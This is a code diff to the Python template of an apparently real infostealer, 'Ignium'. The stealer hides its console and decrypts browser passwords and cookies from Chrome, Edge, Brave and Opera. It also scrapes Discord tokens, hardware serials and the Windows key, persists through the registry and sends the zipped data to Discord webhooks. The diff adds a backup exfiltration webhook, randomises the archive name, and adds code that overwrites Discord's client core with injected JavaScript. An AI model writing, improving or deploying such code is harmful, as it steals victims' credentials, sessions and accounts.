@@ -1,4 +1,4 @@
-ignium_template = r'''import sys,os,json,requests,getpass,socket,platform,time,winreg,subprocess,shutil,re,sqlite3,base64,glob,psutil,ctypes,uuid
+payme = r'''import sys,os,json,requests,getpass,socket,platform,time,winreg,subprocess,shutil,re,sqlite3,base64,glob,psutil,ctypes,uuid
 from datetime import datetime
 try: from Crypto.Cipher import AES
 except: from Cryptodome.Cipher import AES
@@ -9,6 +9,18 @@ except: pass
 try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 except: pass
 WEBHOOK = "%WEBHOOK%"
+BACKUP_WEBHOOK = "%BACKUP_WEBHOOK%"
+def report(p, f=None):
+    for u in [WEBHOOK, BACKUP_WEBHOOK]:
+        if not u or "YOUR_WEBHOOK_HERE" in u: continue
+        try:
+            if f:
+                for v in f.values():
+                    if isinstance(v, tuple) and len(v) > 1 and hasattr(v[1], 'seek'): v[1].seek(0)
+                requests.post(u, data={'payload_json': json.dumps(p)}, files=f, timeout=60)
+            else: requests.post(u, json=p, timeout=60)
+            break
+        except: pass
 INJECTION_JS = %INJECTION_JS%
 DO_INJECT = %DO_INJECT%
 DO_STARTUP = %DO_STARTUP%
@@ -180,7 +192,7 @@ class Chrom:
             'Edge': (os.path.join(self.aD, 'Microsoft/Edge/User Data'), 'msedge'),
             'Brave': (os.path.join(self.aD, 'BraveSoftware/Brave-Browser/User Data'), 'brave'),
             'Opera': (os.path.join(self.ro, 'Opera Software/Opera Stable'), 'opera'),
-            'Opera GX': (os.path.join(self.ro, 'Opera Software/Opera GX Stable'), 'opera')
+            'Opera GX': (os.path.join(self.ro, 'Opera Software/Opera GX Stable'), 'opera-gx')
         }
         self.bps = {
             'google-chrome': os.path.join(os.getenv('ProgramFiles', 'C:\\Program Files'), 'Google/Chrome/Application/chrome.exe'),
@@ -195,7 +207,7 @@ class Chrom:
     def run(self):
         for n, (dp, k) in self.br.items():
             if not os.path.exists(dp): continue
-            bp = self.bps.get(k)
+            mK = gMK(os.path.join(dp, 'Local State')); bp = self.bps.get(k)
             if not bp or not os.path.exists(bp):
                 for p in [os.getenv('ProgramFiles'), os.getenv('ProgramFiles(x86)'), 'C:\\Program Files', 'C:\\Program Files (x86)']:
                     if not p: continue
@@ -206,7 +218,6 @@ class Chrom:
                 cks = g_c(bp, dp)
                 if cks:
                     with open(os.path.join(self.dir, n, 'cookies.txt'), 'w', encoding='utf-8') as f: f.write(cks)
-            mK = gMK(os.path.join(dp, 'Local State'))
             if mK:
                 for pr in ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']:
                     pP = os.path.join(dp, pr)
@@ -226,7 +237,7 @@ class Chrom:
                 c.close(); os.remove(tP)
             except: pass
     def snd(self):
-        zP = os.path.join(self.tmp, 'ignium'); shutil.make_archive(zP, 'zip', self.dir); fZ = zP + '.zip'
+        zP = os.path.join(self.tmp, os.urandom(6).hex()); shutil.make_archive(zP, 'zip', self.dir); fZ = zP + '.zip'
         zS = os.path.getsize(fZ) / 1024
         pay = {
             "username": "Ignium | t.me/igniumlol",
@@ -242,7 +253,11 @@ class Chrom:
                 "timestamp": datetime.utcnow().isoformat()
             }]
         }
-        with open(fZ, 'rb') as f: requests.post(self.wH, data={'payload_json': json.dumps(pay)}, files={'file': (os.path.basename(fZ), f)})
+        if zS <= 8192:
+            with open(fZ, 'rb') as f: report(pay, {'file': (os.path.basename(fZ), f)})
+        else:
+            pay['embeds'][0]['fields'].append({"name": "⚠️  Warning", "value": f"Vault is too large ({zS/1024:.2f} MB) to send via Discord.", "inline": False})
+            report(pay)
         shutil.rmtree(self.dir); os.remove(fZ)
 def gT():
     t, a, l = [], os.environ.get('APPDATA', ''), os.environ.get('LOCALAPPDATA', '')
@@ -263,6 +278,35 @@ def gT():
                     for m in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", c): t.append(m)
             except: pass
     return list(set(t))
+def inj():
+    if not DO_INJECT: return
+    local = os.getenv('LOCALAPPDATA')
+    for flavor in ["Discord", "DiscordCanary", "DiscordPTB"]:
+        base = os.path.join(local, flavor)
+        if not os.path.exists(base): continue
+        try:
+            apps = [f for f in os.listdir(base) if f.startswith("app-")]
+            if not apps: continue
+            apps.sort(reverse=True)
+            latest_app = os.path.join(base, apps[0])
+            modules_path = os.path.join(latest_app, "modules")
+            if not os.path.exists(modules_path): continue
+            cores = [f for f in os.listdir(modules_path) if f.startswith("discord_desktop_core-")]
+            if not cores: continue
+            cores.sort(reverse=True)
+            target = os.path.join(modules_path, cores[0], "discord_desktop_core")
+            if not os.path.exists(target): continue
+            with open(os.path.join(target, "index.js"), "w", encoding="utf-8") as f: f.write(INJECTION_JS)
+            res_path = os.path.join(latest_app, "resources", "app")
+            if os.path.exists(res_path):
+                try: shutil.rmtree(res_path)
+                except: pass
+            idp = os.path.join(target, "initiation")
+            if not os.path.exists(idp): os.makedirs(idp)
+            k_b(flavor + ".exe")
+            upd = os.path.join(base, "Update.exe")
+            if os.path.exists(upd): subprocess.Popen([upd, "--processStart", flavor + ".exe"], shell=True)
+        except: pass
 def sU():
     if not DO_STARTUP: return
     try:
@@ -274,7 +318,7 @@ def sU():
             winreg.CloseKey(k)
     except: pass
 def sR():
-    sU()
+    sU(); inj()
     if is_analysis(): return
     try: Chrom(WEBHOOK)
     except: pass
@@ -291,6 +335,5 @@ def sR():
         {"name": "💻  Hardware Information", "value": f"```ini\n[CPU Serial]: {hW.get('CPU')}\n[GPU Serial]: {hW.get('GPU')}\n[RAM Serial]: {hW.get('RAM')}\n[Disk Serial]: {hW.get('Disk')}\n[BIOS Serial]: {hW.get('BIOS')}\n[Base Serial]: {hW.get('Base')}\n[Windows Key]: {hW.get('WKey')}\n```", "inline": False}
     ], "footer": {"text": f"{inf.get('Hostname')} | t.me/igniumlol", "icon_url": "https://cdn3.emoji.gg/emojis/203899-shock.png"}, "timestamp": datetime.utcnow().isoformat()}
     emb['fields'].extend(tF[:20]); pay = {'username': 'Ignium | t.me/igniumlol', 'avatar_url': 'https://cdn3.emoji.gg/emojis/203899-shock.png', 'embeds': [emb]}
-    try: requests.post(WEBHOOK, json=pay, timeout=30)
-    except: pass
+    report(pay)
 '''
